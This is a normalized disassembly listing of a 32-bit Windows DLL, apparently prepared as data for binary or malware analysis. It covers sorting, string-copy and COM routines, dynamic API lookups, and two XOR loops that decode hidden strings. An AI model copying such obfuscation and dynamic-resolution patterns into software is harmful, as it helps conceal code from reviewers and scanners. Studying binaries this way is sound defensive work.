call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] ecx
mov [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov eax [ esi ]
mov ecx [ ebx + esi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebx + esi ]
mov eax [ ecx + esi ]
mov [ ecx + esi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
mov ecx [ edi ]
mov eax edi
sub eax ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] edx
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ ebx + edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ edi ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx + edi ]
mov [ ebx + edi ] edx
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov ecx eax
sub eax [ ebp - 0xc ]
sub ecx ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push eax
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx [ eax ]
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov edx [ ebx + esi ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx ]
mov edx [ edx ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ eax ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] ecx
mov [ ebx + esi ] eax
mov eax [ ebx + esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ edi ]
mov eax [ ecx ]
mov [ ecx ] edx
mov [ edi ] eax
mov edx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10005600
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f8ee
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
xor ebx ebx
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_1001c310
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
push ebx
lea eax [ edi + 0x1c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1001c310
mov [ ebp - 0x4 ] 0x1
mov cx [ edi + 0x38 ]
mov [ esi + 0x38 ] cx
push 0xffffffff
lea ecx [ esi + 0x3c ]
push ebx
lea eax [ edi + 0x3c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1001c310
push 0xffffffff
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x2
push ebx
lea eax [ edi + 0x58 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1001c310
mov cl [ edi + 0x74 ]
mov [ esi + 0x74 ] cl
mov edx [ edi + 0x78 ]
mov [ esi + 0x78 ] edx
mov eax [ edi + 0x7c ]
mov [ esi + 0x7c ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100056d7
push 0x4c
mov eax sub_1007f195
call sub_10007703
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x28 ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x50 ] edx
call sub_1004aa85
lea eax [ ebp + 0x14 ]
xor ebx ebx
push eax
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
call sub_100161f2
test al al
je r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
or [ edi ] 0x1
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000fa70
mov eax [ ebp - 0x2c ]
xor esi esi
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] 0x30
jl r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
call sub_1001c5c0
mov eax esi
call sub_10019c00
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10050f80
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
cmp [ eax ] 0x39
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
movzx eax [ eax + esi ]
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10050f80
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1001905b
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov esi [ ebp - 0x58 ]
sub_10005810
push ebp
mov ebp esp
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx 0x3
mov [ ebp - 0xb4 ] eax
xor eax eax
push ebx
mov [ ebp - 0xb8 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x14 ] dx
push esi
mov [ ebp - 0xac ] eax
mov [ ebp - 0xb0 ] eax
lea edx [ eax + 0x1 ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x6d
and esi 0xff
mov [ ebp + eax * 2 - 0x38 ] si
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x24 ] ax
mov esi [ ecx ]
lea eax [ ebp - 0xac ]
push eax
push r--data
lea eax [ ebp - 0x38 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xac ]
jns r-xdata
lea edx [ ebp - 0xa4 ]
mov [ ebp - 0xa4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0xa2
call sub_1000a6f0
mov ebx [ ebp - 0xb8 ]
mov esi [ ebx + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x12e
jmp r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x10c
call sub_1000a6f0
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
mov eax 0x11b
call sub_1000a6f0
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xa4 ]
push ecx
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x97
jmp r-xdata
call sub_1000a6f0
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0xa8 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xa8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xa8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x101
jmp r-xdata
mov eax [ ebp - 0xac ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xa4 ] 0x0
lea edx [ ebp - 0x50 ]
mov eax 0x112
call sub_1000a6f0
mov esi [ ebp - 0xa8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xa8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xb4 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xb0 ]
push ecx
mov ecx [ ebp - 0xac ]
push ecx
push eax
call edx
mov eax [ ebp - 0xb0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x31
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x65
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa4 ]
test eax eax
je r-xdata
sub_10005a90
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x71c71c6
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_100616c6
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x71c71c7
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1000c030
mov eax esi
cmp eax esi
jae r-xdata
sub_10005afb
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10005b40
push ecx
push r--data
call sub_100024e0
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_10005b80
push esi
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_10065045
add esp 0x4
push eax
call sub_1005b4d5
add esp 0x4
sub_10005bd0
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
add esi 0x10
push ebx
mov eax [ esi + 0xc ]
mov [ edi + 0x1c ] eax
mov ecx [ esi + 0x10 ]
add esi 0x24
mov [ edi + 0x20 ] ecx
lea edx [ esi - 0x10 ]
add edi 0x24
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ebx 0x8
cmp [ edi + 0x14 ] ebx
jb r-xdata
lea eax [ esi - 0x10 ]
cmp edi eax
je r-xdata
mov eax edi
pop ebx
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] dx
cmp [ esi + 0x4 ] ebx
lea ebx [ esi - 0x10 ]
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_10065045
add esp 0x4
mov edx [ ebx ]
mov [ edi ] edx
mov [ ebx ] 0x0
mov eax [ esi ]
lea ecx [ eax + eax + 0x2 ]
push ecx
push ebx
push edi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov eax [ esi ]
mov [ edi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ esi + 0x4 ] 0x7
mov [ esi ] 0x0
mov [ ebx ] dx
sub_10005c99
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1005bf6b
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_10005d00
push ebp
mov ebp esp
push 0xffffffff
push sub_10080499
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esi
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
cmp ecx eax
je r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] esi
mov [ ebx ] 0x0
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
mov [ ebp - 0x14 ] 0x1
cmp esi [ edi + 0x4 ]
je r-xdata
push eax
call sub_10050de0
add esp 0x4
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
add [ ebp - 0x10 ] 0x1c
add esi 0x1c
cmp esi [ edi + 0x4 ]
jne r-xdata
push 0x1
push r--data
mov ecx ebx
call sub_1005be50
push 0xffffffff
push 0x0
push esi
mov ecx ebx
call sub_10040f60
mov ecx [ ebp - 0x10 ]
cmp ecx [ edi + 0x4 ]
je r-xdata
sub_10005dab
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_1002788e
mov eax esi
jmp r-xdata
sub_10005e18
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1002788e
mov eax esi
jmp r-xdata
sub_10005e80
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0x108 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x104 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffd6
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xfc ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xfc ]
jns r-xdata
lea edx [ ebp - 0xf0 ]
mov [ ebp - 0xf0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x6c
call sub_1000a6f0
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0x12e
jmp r-xdata
lea edx [ ebp - 0xec ]
mov eax 0xc5
call sub_1000a6f0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x38 ]
mov eax 0x6d
call sub_1000a6f0
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x34
jmp r-xdata
call sub_1000a6f0
lea edx [ ebp - 0x4c ]
mov eax 0x7a
call sub_1000a6f0
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x6a
jmp r-xdata
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xf0 ] 0x0
lea edx [ ebp - 0x60 ]
mov eax 0x80
call sub_1000a6f0
mov esi [ edi + 0x1c ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x2b
jmp r-xdata
mov ecx [ edi + 0x10 ]
lea eax [ ebp - 0x100 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x100 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x100 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x32
jmp r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0xe5
call sub_1000a6f0
mov esi [ ebp - 0x100 ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x100 ] eax
mov edx [ edi + 0x14 ]
lea ecx [ ebp - 0xf8 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xf8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf8 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xc4
call sub_1000a6f0
lea edx [ ebp - 0x14 ]
mov eax 0x7b
call sub_1000a6f0
mov esi [ ebp - 0xf8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10038260
mov eax [ edi + 0x18 ]
lea edx [ ebp - 0xf4 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xf4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf4 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf8 ] eax
lea edx [ ebp - 0xd8 ]
mov eax 0xab
call sub_1000a6f0
mov esi [ ebp - 0xf4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10038260
mov eax [ ebp - 0x108 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x104 ]
push edx
mov edx [ ebp - 0xfc ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x104 ]
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf4 ] eax
lea edx [ ebp - 0xb8 ]
mov eax 0xf4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x104 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xf0 ]
test eax eax
je r-xdata
sub_10006210
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x40
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_10006240
push ebp
mov ebp esp
push 0xffffffff
push sub_100828c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx ]
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x4 ]
push ecx
call sub_10058ba0
mov ecx [ ebx ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x70 ] eax
call sub_1001cc00
mov eax [ eax ]
mov edi [ HeapFree@IAT ]
test eax eax
mov eax [ ebp - 0x64 ]
setne [ ebp - 0x69 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x69 ] 0x0
lea esi [ ebp - 0x68 ]
je r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
mov eax [ ebx ]
push eax
call sub_10054a50
mov esi [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
call sub_1001cc00
mov ebx [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_10054700
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ ebp - 0x70 ]
cmp eax 0x7
jne r-xdata
mov ecx [ ebx ]
push ecx
lea esi [ ebp - 0x68 ]
call sub_10054a50
mov esi [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
xor ebx ebx
cmp [ eax ] ebx
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
cmp eax 0x2
jne r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_10054700
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x8
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx ebx
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
push 0x3e8
call [ Sleep@IAT ]
xor eax eax
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x60 ]
call sub_1004a800
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10049e30
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4c ] 0x8
mov esi eax
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov ecx [ ebx + 0x14 ]
jb r-xdata
mov [ ebp - 0x64 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x9
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_10007340
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
call sub_100237a0
jmp r-xdata
cmp eax 0xb
jne r-xdata
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] ebx
cmp eax ebx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edx edx
mov [ ebp - 0x4c ] 0x7
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x60 ] dx
cmp esi edi
je r-xdata
mov ecx [ ebp - 0x60 ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x6
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_10007340
mov ecx [ eax ]
call sub_1002d040
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1004d910
jmp r-xdata
mov edi edi
mov [ ebp - 0x64 ] ebx
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ esi ]
